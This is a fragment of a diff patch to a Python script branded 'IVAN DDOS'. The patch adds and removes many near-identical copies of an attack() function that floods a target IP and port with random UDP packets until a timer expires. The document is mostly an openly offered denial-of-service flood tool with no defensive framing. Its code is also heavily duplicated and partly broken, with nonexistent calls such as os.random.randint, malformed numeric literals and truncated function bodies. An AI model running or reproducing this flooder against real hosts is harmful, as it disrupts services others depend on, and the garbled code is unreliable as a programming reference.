-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -26065,7 +18827,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -26097,7 +18859,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -26129,7 +18891,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -26161,7 +18923,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -26193,7 +18955,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -26219,7 +18981,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -26251,39 +19013,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -26315,7 +19045,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -26347,415 +19077,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-   
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
- 
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(6161, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-
-    print('\033[91m Tamat')
-    os.system("clear")
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -26787,225 +19109,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-    
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-    
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -27381,7 +19485,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -27413,7 +19517,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -27445,7 +19549,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -27477,7 +19581,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -27509,7 +19613,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -27535,7 +19639,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -27567,39 +19671,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-        endtime = tt()
-        if (startup + time) < endtime:
-            break
-
-        sock.sendto(threads, (ip, port))
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -27631,7 +19703,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
+    threads = os.urandom(min(00000000099999999956789000000000999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -27663,415 +19735,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(0000000009999999995678905566778899, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
